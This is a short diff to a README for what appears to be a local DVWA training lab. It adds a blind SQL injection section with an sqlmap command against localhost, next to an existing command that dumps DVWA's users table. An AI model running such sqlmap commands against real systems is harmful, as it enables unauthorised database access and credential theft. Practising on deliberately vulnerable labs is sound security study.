@@ -38,3 +38,9 @@ taking over of database servers.
 ```
 ./sqlmap/sqlmap.py -u "http://localhost:8090/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<YOUR PHPSESSID>" -D dvwa -T users --dump
 ```
+
+### Blind SQL Injection
+
+```
+./sqlmap/sqlmap.py -u "http://localhost:8090/vulnerabilities/sqli_blind/?id=&Submit=Submit#" --cookie="security=low; PHPSESSID=<YOUR PHPSESSID>"
+```
